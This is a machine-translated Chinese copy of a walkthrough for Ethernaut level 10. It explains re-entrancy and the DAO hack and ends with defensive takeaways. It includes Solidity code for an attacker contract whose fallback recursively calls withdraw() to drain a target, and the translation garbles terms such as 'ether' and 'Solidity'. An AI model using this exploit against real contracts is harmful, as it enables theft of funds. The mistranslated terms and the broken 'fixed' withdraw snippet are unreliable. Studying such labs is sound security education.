<html>
<head>
<title>Ethernaut Lvl 10 Re-entrancy Walkthrough: How to abuse execution ordering and reproduce the DAO hack</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Ethernaut Lvl 10重入演练:如何滥用执行排序和重现DAO hack</h1>
<blockquote>原文：<a href="https://medium.com/coinmonks/ethernaut-lvl-10-re-entrancy-walkthrough-how-to-abuse-execution-ordering-and-reproduce-the-dao-7ec88b912c14?source=collection_archive---------1-----------------------#2018-08-27">https://medium.com/coinmonks/ethernaut-lvl-10-re-entrancy-walkthrough-how-to-abuse-execution-ordering-and-reproduce-the-dao-7ec88b912c14?source=collection_archive---------1-----------------------#2018-08-27</a></blockquote><div><div class="ef hh hi hj hk hl"/><div class="hm hn ho hp hq"><div class=""/><div class=""><h2 id="e203" class="pw-subtitle-paragraph iq hs ht bd b ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ek translated">这是一个围绕<a class="ae ji" href="https://openzeppelin.org/" rel="noopener ugc nofollow" target="_blank"> Zeppelin </a>团队的<a class="ae ji" href="https://ethernaut.zeppelin.solutions/" rel="noopener ugc nofollow" target="_blank">智能合约安全拼图</a>的<a class="ae ji" rel="noopener" href="/@nicolezhu">深度系列</a>。我们学习关键的可靠性概念，以便100%靠自己解决难题。</h2></div><p id="47d0" class="pw-post-body-paragraph jj jk ht jl b jm jn iu jo jp jq ix jr js jt ju jv jw jx jy jz ka kb kc kd ke hm dt translated">这个关卡需要你从契约中偷出所有的乙醚。</p></div><div class="ab cl kf kg hb kh" role="separator"><span class="ki bw bk kj kk kl"/><span class="ki bw bk kj kk kl"/><span class="ki bw bk kj kk"/></div><div class="hm hn ho hp hq"><h1 id="e27d" class="km kn ht bd ko kp kq kr ks kt ku kv kw iz kx ja ky jc kz jd la jf lb jg lc ld dt translated"><code class="eh le lf lg lh b">What is re-entrancy</code></h1><p id="cfb1" class="pw-post-body-paragraph jj jk ht jl b jm li iu jo jp lj ix jr js lk ju jv jw ll jy jz ka lm kc kd ke hm dt translated">重入发生在单线程计算环境中，当执行堆栈<strong class="jl hu">跳转</strong>或<strong class="jl hu">调用</strong>子例程时，在返回到原始执行之前。</p><p id="3109" class="pw-post-body-paragraph jj jk ht jl b jm jn iu jo jp jq ix jr js jt ju jv jw jx jy jz ka kb kc kd ke hm dt translated">一方面，这种单线程执行确保了契约的原子性，并消除了一些竞争条件。另一方面，<strong class="jl hu">合同容易受到执行顺序不佳的影响。</strong></p><figure class="lo lp lq lr fq ls fe ff paragraph-image"><div role="button" tabindex="0" class="lt lu di lv bf lw"><div class="fe ff ln"><img src="../Images/e7b041dc52857ad745349358d23daf20.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GmxbAm8SBOHcPSWS350ieg.jpeg"/></div></div><figcaption class="lz ma fg fe ff mb mc bd b be z ek"><strong class="bd md">Example of poor code ordering</strong>: transferring the amount before deducting from internal balances ledger</figcaption></figure><p id="d242" class="pw-post-body-paragraph jj jk ht jl b jm jn iu jo jp jq ix jr js jt ju jv jw jx jy jz ka kb kc kd ke hm dt translated">在上面的例子中，合同B是一个恶意合同，它递归地调用A . retract()来耗尽合同A的资金。请注意，在合约A从其递归循环返回之前，资金提取成功完成，甚至意识到B已经提取了远远超过其自身余额的金额。</p><p id="720d" class="pw-post-body-paragraph jj jk ht jl b jm jn iu jo jp jq ix jr js jt ju jv jw jx jy jz ka kb kc kd ke hm dt translated">这个以太网级别利用了这个可重入性问题以及导致<a class="ae ji" href="http://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/" rel="noopener ugc nofollow" target="_blank"> DAO hack </a>的其他因素:</p><ul class=""><li id="f35c" class="me mf ht jl b jm jn jp jq js mg jw mh ka mi ke mj mk ml mm dt translated">回退功能<a class="ae ji" href="https://hackernoon.com/ethernaut-lvl-1-walkthrough-how-to-abuse-the-fallback-function-118057b68b56" rel="noopener ugc nofollow" target="_blank">可以被任何人调用&amp;执行恶意代码</a></li><li id="38a5" class="me mf ht jl b jm mn jp mo js mp jw mq ka mr ke mj mk ml mm dt translated">恶意外部合同<a class="ae ji" rel="noopener" href="/coinmonks/ethernaut-lvl-9-king-walkthrough-how-bad-contracts-can-abuse-withdrawals-db12754f359b">可以滥用提款</a></li></ul></div><div class="ab cl kf kg hb kh" role="separator"><span class="ki bw bk kj kk kl"/><span class="ki bw bk kj kk kl"/><span class="ki bw bk kj kk"/></div><div class="hm hn ho hp hq"><h1 id="2426" class="km kn ht bd ko kp kq kr ks kt ku kv kw iz kx ja ky jc kz jd la jf lb jg lc ld dt translated">详细演练</h1><figure class="lo lp lq lr fq ls fe ff paragraph-image"><div role="button" tabindex="0" class="lt lu di lv bf lw"><div class="fe ff ms"><img src="../Images/458168251f9448519d01c1661dea39f7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5bgzulYxaaMebb0Qa2Ynxg.png"/></div></div></figure><ol class=""><li id="7638" class="me mf ht jl b jm jn jp jq js mg jw mh ka mi ke mt mk ml mm dt translated">创建一个名为<code class="eh le lf lg lh b">Reenter.sol</code>的恶意合同，该合同会先向<code class="eh le lf lg lh b">Reentrance.sol</code>捐款，然后递归退出，直到Reentrance资金耗尽。</li></ol><pre class="lo lp lq lr fq mu lh mv mw aw mx dt"><span id="d291" class="my kn ht lh b fv mz na l nb nc">contract Reenter {<br/>    Reentrance public original = Reentrance(YOUR_INSTANCE_ADDR);<br/>    uint public amount = 1 ether;    //withdrawal amount each time<br/>}</span></pre><p id="4981" class="pw-post-body-paragraph jj jk ht jl b jm jn iu jo jp jq ix jr js jt ju jv jw jx jy jz ka kb kc kd ke hm dt translated">2.在合同施工时用醚播种<code class="eh le lf lg lh b">Reenter.sol</code>;</p><pre class="lo lp lq lr fq mu lh mv mw aw mx dt"><span id="3721" class="my kn ht lh b fv mz na l nb nc">constructor() public payable {<br/>}</span></pre><p id="e33f" class="pw-post-body-paragraph jj jk ht jl b jm jn iu jo jp jq ix jr js jt ju jv jw jx jy jz ka kb kc kd ke hm dt translated">3.创建一个公共功能，以便<code class="eh le lf lg lh b">Reenter.sol</code>可以向<code class="eh le lf lg lh b">Reentrance.sol</code>捐款，并在其<code class="eh le lf lg lh b">balances</code>分类帐中注册为捐款人:</p><pre class="lo lp lq lr fq mu lh mv mw aw mx dt"><span id="cf6a" class="my kn ht lh b fv mz na l nb nc">function donateToSelf() public {<br/>    original.donate.value(amount).gas(4000000)(address(this));//need to add value to this fn<br/>  }</span></pre><p id="6c4a" class="pw-post-body-paragraph jj jk ht jl b jm jn iu jo jp jq ix jr js jt ju jv jw jx jy jz ka kb kc kd ke hm dt translated">调用这个函数将确保你的恶意契约至少能够调用<code class="eh le lf lg lh b">withdraw()</code>一次，即通过<code class="eh le lf lg lh b">if(balances[msg.sender] &gt;= _amount)</code>检查。</p><figure class="lo lp lq lr fq ls fe ff paragraph-image"><div role="button" tabindex="0" class="lt lu di lv bf lw"><div class="fe ff nd"><img src="../Images/cce9d0dfb100eb59b02b7b0ad299407d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HGRY9Lbox56-o9nbCgBepg.jpeg"/></div></div></figure><p id="0749" class="pw-post-body-paragraph jj jk ht jl b jm jn iu jo jp jq ix jr js jt ju jv jw jx jy jz ka kb kc kd ke hm dt translated">上图展示了让<code class="eh le lf lg lh b">Reenter.sol</code>从<code class="eh le lf lg lh b">Reentrance.sol</code>提取所有资金的递归循环。</p><p id="e015" class="pw-post-body-paragraph jj jk ht jl b jm jn iu jo jp jq ix jr js jt ju jv jw jx jy jz ka kb kc kd ke hm dt translated">让我们在契约B中实现一个恶意回退功能，这样当契约A执行<code class="eh le lf lg lh b">msg.sender.call.value(_amount)()</code>来退还契约B时，您的恶意契约会触发更多的提款。</p><p id="6878" class="pw-post-body-paragraph jj jk ht jl b jm jn iu jo jp jq ix jr js jt ju jv jw jx jy jz ka kb kc kd ke hm dt translated">4.实现此恶意回退功能:</p><pre class="lo lp lq lr fq mu lh mv mw aw mx dt"><span id="bc50" class="my kn ht lh b fv mz na l nb nc">function() public payable {<br/>    if (address(original).balance != 0 ) {<br/>        original.withdraw(amount); <br/>    }<br/>}</span></pre><p id="3ef7" class="pw-post-body-paragraph jj jk ht jl b jm jn iu jo jp jq ix jr js jt ju jv jw jx jy jz ka kb kc kd ke hm dt translated">5.最后，在Remix中:将你的合同部署到Ropsten，用乙醚播种，捐赠给<code class="eh le lf lg lh b">Reentrance</code>，然后调用你的后备功能耗尽<code class="eh le lf lg lh b">Reentrance</code>的所有资金。</p></div><div class="ab cl kf kg hb kh" role="separator"><span class="ki bw bk kj kk kl"/><span class="ki bw bk kj kk kl"/><span class="ki bw bk kj kk"/></div><div class="hm hn ho hp hq"><h1 id="c35c" class="km kn ht bd ko kp kq kr ks kt ku kv kw iz kx ja ky jc kz jd la jf lb jg lc ld dt translated">关键安全要点</h1><ul class=""><li id="4c7e" class="me mf ht jl b jm li jp lj js ne jw nf ka ng ke mj mk ml mm dt translated">执行的顺序在可靠性方面真的很重要。如果您必须进行外部函数调用，请进行最后一项操作(在所有必要的检查和平衡之后):</li></ul><pre class="lo lp lq lr fq mu lh mv mw aw mx dt"><span id="716f" class="my kn ht lh b fv mz na l nb nc">function withdraw(uint _amount) public {<br/>    if(balances[msg.sender] &gt;= _amount) {<br/>        balances[msg.sender] -= _amount;         <br/>        if(msg.sender.transfer(_amount)()) {<br/>            _amount;<br/>        }<br/>    }<br/>}<br/>// Or even better, invoke transfer in a separate function</span></pre><ul class=""><li id="c949" class="me mf ht jl b jm jn jp jq js mg jw mh ka mi ke mj mk ml mm dt translated">包括一个<strong class="jl hu">互斥</strong>来防止重入，例如使用一个布尔<code class="eh le lf lg lh b">lock</code>变量来表示执行深度。</li><li id="48f8" class="me mf ht jl b jm mn jp mo js mp jw mq ka mr ke mj mk ml mm dt translated">使用<strong class="jl hu">函数修饰符</strong>检查不变量时要小心:修饰符在函数开始时执行。如果变量状态在整个函数中会改变，考虑将修饰符提取到位于函数中正确行的检查中。</li><li id="f991" class="me mf ht jl b jm mn jp mo js mp jw mq ka mr ke mj mk ml mm dt translated">“使用<code class="eh le lf lg lh b">transfer</code>将资金移出你的合同，因为它<code class="eh le lf lg lh b">throw</code> s和限制天然气期货。像<code class="eh le lf lg lh b">call</code>和<code class="eh le lf lg lh b">send</code>这样的低级函数只是返回false，但不会在接收契约失败时中断执行流程。”—从以太网级别</li><li id="7eb4" class="me mf ht jl b jm mn jp mo js mp jw mq ka mr ke mj mk ml mm dt translated">点击这里查看DAO hack 的完整<a class="ae ji" href="http://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/" rel="noopener ugc nofollow" target="_blank">分析。</a></li></ul><h1 id="fd2d" class="km kn ht bd ko kp nh kr ks kt ni kv kw iz nj ja ky jc nk jd la jf nl jg lc ld dt translated">更多级别</h1><div class="nm nn fm fo no np"><a rel="noopener follow" target="_blank" href="/coinmonks/ethernaut-lvl-9-king-walkthrough-how-bad-contracts-can-abuse-withdrawals-db12754f359b"><div class="nq ab ej"><div class="nr ab ns cl cj nt"><h2 class="bd hu fv z el nu eo ep nv er et hs dt translated">以太者Lvl 9国王演练:如何糟糕的合同可以滥用提款</h2><div class="nw l"><h3 class="bd b fv z el nu eo ep nv er et ek translated">这是一个围绕齐柏林团队的智能合同安全难题的深入系列。我们学习关键的可靠性概念…</h3></div><div class="nx l"><p class="bd b gc z el nu eo ep nv er et ek translated">medium.com</p></div></div><div class="ny l"><div class="nz l oa ob oc ny od lx np"/></div></div></a></div><div class="nm nn fm fo no np"><a rel="noopener follow" target="_blank" href="/coinmonks/ethernaut-lvl-11-elevator-walkthrough-how-to-abuse-solidity-interfaces-and-function-state-41005470121d"><div class="nq ab ej"><div class="nr ab ns cl cj nt"><h2 class="bd hu fv z el nu eo ep nv er et hs dt translated">Ethernaut Lvl 11电梯演练:如何滥用Solidity接口和功能状态…</h2><div class="nw l"><h3 class="bd b fv z el nu eo ep nv er et ek translated">这是一个围绕齐柏林团队的智能合同安全难题的深入系列。我们学习关键的可靠性概念…</h3></div><div class="nx l"><p class="bd b gc z el nu eo ep nv er et ek translated">medium.com</p></div></div><div class="ny l"><div class="oe l oa ob oc ny od lx np"/></div></div></a></div><blockquote class="of"><p id="76cc" class="og oh ht bd oi oj ok ol om on oo ke ek translated"><a class="ae ji" href="https://coincodecap.com/?utm_source=coinmonks" rel="noopener ugc nofollow" target="_blank">直接在您的收件箱中获得最佳软件交易</a></p></blockquote><figure class="oq or os ot ou ls fe ff paragraph-image"><a href="https://coincodecap.com/?utm_source=coinmonks"><div class="fe ff op"><img src="../Images/7c0b3dfdcbfea594cc0ae7d4f9bf6fcb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1168/format:webp/0*OJ-qb5G6i863msBB.png"/></div></a></figure></div></div>    
</body>
</html>